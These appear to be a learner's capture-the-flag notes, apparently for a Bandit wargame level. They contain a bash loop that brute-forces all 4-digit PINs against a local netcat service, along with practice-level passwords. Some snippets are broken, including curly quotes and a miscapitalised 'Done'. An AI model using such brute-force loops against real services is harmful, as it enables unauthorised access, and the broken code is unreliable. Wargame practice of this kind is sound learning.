![](<Pasted image 20260515230002.png>)

![](<Pasted image 20260515230027.png>)

![](<Pasted image 20260515230047.png>)

![](<Pasted image 20260515230059.png>)

Using the following command to try brute forcing:

for i in {0000..9999}; do echo “gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i”; done | nc localhost 30002



[add ‘2>/dev/null’ at the end if you only want the stdout]

for i in {0000..9999}; do echo “gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i”; done | nc localhost 30002 >/dev/null 2>&1

<!--Explain the logic for the above command!!!-->

![](<Pasted image 20260515230137.png>)

<!--echo "" > pins && for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> pins; done && cat pins | nc localhost 30002
THIS COMMAND WORKED NOT THE ONE MENTIONED BEFORE, EXPLAIN WHY, ALSO THIS THIS SCRIPT DID NOT WORK TOO:

“
#!/bin/bash

for i in {0000..9999}
do
        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> possibilities.txt
Done
-->

```
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

